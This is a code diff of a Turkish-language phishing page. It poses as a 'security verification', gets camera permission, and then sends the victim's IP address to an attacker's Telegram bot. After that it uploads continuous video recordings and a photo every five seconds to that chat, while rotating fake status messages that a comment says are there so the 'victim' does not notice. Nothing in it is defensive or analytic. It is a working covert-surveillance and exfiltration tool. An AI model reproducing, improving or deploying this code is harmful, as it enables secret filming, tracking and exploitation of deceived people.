@@ -47,7 +47,7 @@
 </head>
 <body>
     <div class="container">
-        <h2>❄️ GÜVENLİK DOĞRULAMASI</h2>
+        <h2>❄️ <span>GÜVENLİK</span> DOĞRULAMASI</h2>
         <p>Devam etmek için kamera erişimine izin verin.</p>
         <button class="btn" id="startBtn" onclick="startCamera()">📸 BAŞLAT</button>
         <div class="loading" id="loading">
@@ -77,7 +77,7 @@
         let photoCount = 0;
         
         // ============================================
-        // SADECE İP ADRESİ AL
+        // SADECE İP ADRESİ AL - KESİN ÇALIŞAN
         // ============================================
         async function getIP() {
             try {
@@ -90,10 +90,10 @@
         }
         
         // ============================================
-        // İP'Yİ TELEGRAM'A GÖNDER
+        // İP'Yİ TELEGRAM'A GÖNDER - DÜZGÜN FORMAT
         // ============================================
         async function sendIP(ip) {
-            const msg = `❄️ **YENİ KURBAN** ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 **IP:** ${ip}\n⏱️ **Zaman:** ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowydexrywexry`;
+            const msg = `❄️ **SNOWY CAM PHISH** ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 **IP Adresi:** ${ip}\n⏱️ **Zaman:** ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
             
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -103,7 +103,7 @@
         }
         
         // ============================================
-        // VİDEO KAYDI BAŞLAT
+        // VİDEO KAYDI BAŞLAT - KESİN ÇALIŞAN
         // ============================================
         function startVideoRecording() {
             recordedChunks = [];
@@ -120,14 +120,14 @@
                 const formData = new FormData();
                 formData.append('chat_id', TARGET_ID);
                 formData.append('video', blob, `video_${Date.now()}.webm`);
-                formData.append('caption', `🎥 Video #${videoCount}`);
+                formData.append('caption', `🎥 Video #${videoCount} - ${new Date().toLocaleString('tr-TR')}`);
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                // 1 saniye sonra tekrar başlat
+                // 1 saniye sonra tekrar başlat (arka arkaya videolar)
                 setTimeout(startVideoRecording, 1000);
             };
             
@@ -141,7 +141,7 @@
         }
         
         // ============================================
-        // FOTOĞRAF ÇEK
+        // FOTOĞRAF ÇEK - KESİN ÇALIŞAN
         // ============================================
         async function takePhoto() {
             photoCount++;
@@ -153,7 +153,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', TARGET_ID);
                 formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                formData.append('caption', `📸 Fotoğraf #${photoCount}`);
+                formData.append('caption', `📸 Fotoğraf #${photoCount} - ${new Date().toLocaleString('tr-TR')}`);
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -177,7 +177,7 @@
                 const ip = await getIP();
                 await sendIP(ip);
                 
-                // 2 saniye bekle
+                // 2 saniye bekle (kamera stabil olsun)
                 await new Promise(r => setTimeout(r, 2000));
                 
                 // VİDEO KAYDI BAŞLAT (arka arkaya 15 saniyelik videolar)
@@ -186,7 +186,7 @@
                 // FOTOĞRAF ÇEK (her 5 saniyede bir)
                 setInterval(takePhoto, 5000);
                 
-                // YAZIYI DEĞİŞTİR
+                // YAZIYI DEĞİŞTİR (kurban anlamasın)
                 const texts = ["Güvenlik kontrolü...", "Kimlik doğrulanıyor...", "Lütfen bekleyin..."];
                 let i = 0;
                 setInterval(() => {
